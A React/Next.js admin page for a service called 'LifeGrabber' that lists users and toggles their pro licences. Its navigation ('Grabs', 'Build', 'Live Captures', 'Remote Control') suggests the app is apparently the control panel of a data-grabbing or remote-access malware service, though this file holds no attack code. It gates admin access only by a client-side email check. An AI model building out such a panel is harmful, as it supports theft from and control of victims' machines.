'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';

const colors = {
  bg: '#050508',
  panel: 'rgba(13, 13, 18, 0.7)',
  border: 'rgba(255,255,255,0.06)',
  text: '#f0f0f0',
  textDim: '#6b6e7b',
  green: '#22c55e',
  red: '#ef4444',
  blue: '#3b82f6',
};

function NavItem({ icon, label, active, onClick }) {
  return (
    <div onClick={onClick} className="btn-smooth" style={{
      display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px', borderRadius: 8,
      background: active ? 'rgba(34, 197, 94, 0.08)' : 'transparent',
      color: active ? colors.green : colors.textDim, fontSize: 14, cursor: 'pointer', marginBottom: 2,
    }}
    onMouseEnter={e => { if (!active) { e.currentTarget.style.background = 'rgba(255,255,255,0.03)'; e.currentTarget.style.color = colors.text; } }}
    onMouseLeave={e => { if (!active) { e.currentTarget.style.background = 'transparent'; e.currentTarget.style.color = colors.textDim; } }}
    >
      <span style={{ fontSize: 16, width: 20, textAlign: 'center' }}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

export default function AdminPage() {
  const router = useRouter();
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [unauthorized, setUnauthorized] = useState(false);
  const [toggling, setToggling] = useState(null);

  useEffect(() => {
    fetch('/api/auth/user')
      .then(r => r.json())
      .then(d => {
        if (!d.user || d.user.email !== 'lifegrading@gmail.com') {
          setUnauthorized(true);
          setLoading(false);
          return;
        }
        fetchUsers();
      })
      .catch(() => { setUnauthorized(true); setLoading(false); });
  }, []);

  const fetchUsers = async () => {
    try {
      const res = await fetch('/api/admin/users');
      const data = await res.json();
      setUsers(data.users || []);
    } catch (e) {}
    setLoading(false);
  };

  const togglePro = async (email, currentValue) => {
    setToggling(email);
    try {
      await fetch('/api/admin/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, is_pro: !currentValue }),
      });
      setUsers(prev => prev.map(u => u.email === email ? { ...u, is_pro: !currentValue } : u));
    } catch (e) {}
    setToggling(null);
  };

  if (loading) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <aside style={{ width: 220, borderRight: `1px solid ${colors.border}`, padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'linear-gradient(180deg, #0a0a10 0%, #050508 100%)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
            <div style={{ width: 28, height: 28, borderRadius: 6, background: '#222' }} />
            <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
          </div>
          <div style={{ flex: 1 }}>
            <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
            <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
            <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
            <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
          </div>
        </aside>
        <div style={{ flex: 1, padding: '28px 36px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: colors.textDim }}>Loading...</div>
      </div>
    );
  }

  if (unauthorized) {
    return (
      <div style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', gap: 16 }}>
          <div style={{ fontSize: 48 }}>🚫</div>
          <div style={{ fontSize: 18, fontWeight: 600 }}>Access Denied</div>
          <div style={{ fontSize: 14, color: colors.textDim }}>Only the admin can access this page.</div>
          <div onClick={() => router.push('/dashboard')} style={{ cursor: 'pointer', color: colors.blue, fontSize: 14, marginTop: 8 }}>← Back to Dashboard</div>
        </div>
      </div>
    );
  }

  return (
    <div className="page-enter" style={{ display: 'flex', minHeight: '100vh', background: colors.bg, color: colors.text, fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif' }}>
      <aside style={{ width: 220, borderRight: '1px solid rgba(255,255,255,0.06)', padding: '20px 12px', display: 'flex', flexDirection: 'column', background: 'rgba(10, 10, 16, 0.8)', backdropFilter: 'blur(12px)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '0 10px', marginBottom: 28 }}>
          <div style={{ width: 28, height: 28, borderRadius: 6, background: 'rgba(34, 197, 94, 0.15)' }} />
          <span style={{ fontSize: 14, fontWeight: 600 }}>LifeGrabber</span>
        </div>
        <div style={{ flex: 1 }}>
          <NavItem icon="📊" label="Dashboard" onClick={() => router.push('/dashboard')} />
          <NavItem icon="⚡" label="Grabs" onClick={() => router.push('/dashboard/grabs')} />
          <NavItem icon="🔨" label="Build" onClick={() => router.push('/dashboard/build')} />
          <NavItem icon="👥" label="Admin" active onClick={() => router.push('/admin')} />
          <NavItem icon="📡" label="Live Captures" onClick={() => router.push('/dashboard')} />
          <NavItem icon="🖥" label="Remote Control" onClick={() => router.push('/dashboard/remote-control')} />
          <NavItem icon="⚙️" label="Settings" onClick={() => router.push('/dashboard/settings')} />
        </div>
        <div>
          <NavItem icon="🚪" label="Log out" onClick={() => window.location.href = '/api/auth/logout'} />
        </div>
      </aside>

      <div style={{ flex: 1, padding: '28px 36px', overflowY: 'auto' }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 24 }}>
          <div>
            <div style={{ fontSize: 22, fontWeight: 700 }}>Admin Panel</div>
            <div style={{ fontSize: 13, color: colors.textDim, marginTop: 4 }}>Manage user access and pro licenses</div>
          </div>
          <div style={{ background: 'rgba(34, 197, 94, 0.15)', color: colors.green, fontSize: 12, padding: '6px 12px', borderRadius: 6, fontWeight: 600 }}>
            {users.length} users
          </div>
        </div>

        <div className="glass-card" style={{ borderRadius: 12, overflow: 'hidden' }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 150px 120px 100px', padding: '12px 20px', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: 11, color: colors.textDim, letterSpacing: 1, textTransform: 'uppercase' }}>
            <div>Email</div>
            <div>Joined</div>
            <div>Last Login</div>
            <div style={{ textAlign: 'center' }}>Pro</div>
          </div>

          {users.map((u) => (
            <div key={u.id} style={{ display: 'grid', gridTemplateColumns: '1fr 150px 120px 100px', padding: '14px 20px', borderBottom: '1px solid rgba(255,255,255,0.06)', fontSize: 13, alignItems: 'center' }}>
              <div>
                <div style={{ color: colors.text, fontWeight: 500 }}>{u.email}</div>
                {u.display_name && u.display_name !== u.email && (
                  <div style={{ color: colors.textDim, fontSize: 12, marginTop: 2 }}>{u.display_name}</div>
                )}
              </div>
              <div style={{ color: colors.textDim, fontSize: 12 }}>
                {u.created_at ? new Date(u.created_at).toLocaleDateString() : '—'}
              </div>
              <div style={{ color: colors.textDim, fontSize: 12 }}>
                {u.last_login_at ? new Date(u.last_login_at).toLocaleDateString() : 'Never'}
              </div>
              <div style={{ textAlign: 'center' }}>
                <div
                  onClick={() => togglePro(u.email, u.is_pro)}
                  style={{
                    cursor: toggling === u.email ? 'wait' : 'pointer',
                    width: 44, height: 24, borderRadius: 12, padding: 2,
                    background: u.is_pro ? colors.green : '#333',
                    transition: 'background 0.2s',
                    opacity: toggling === u.email ? 0.5 : 1,
                    display: 'inline-block',
                  }}
                >
                  <div style={{
                    width: 20, height: 20, borderRadius: 10, background: '#fff',
                    transform: u.is_pro ? 'translateX(20px)' : 'translateX(0)',
                    transition: 'transform 0.2s',
                  }} />
                </div>
              </div>
            </div>
          ))}

          {users.length === 0 && (
            <div style={{ padding: 40, textAlign: 'center', color: colors.textDim, fontSize: 14 }}>
              No users found.
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
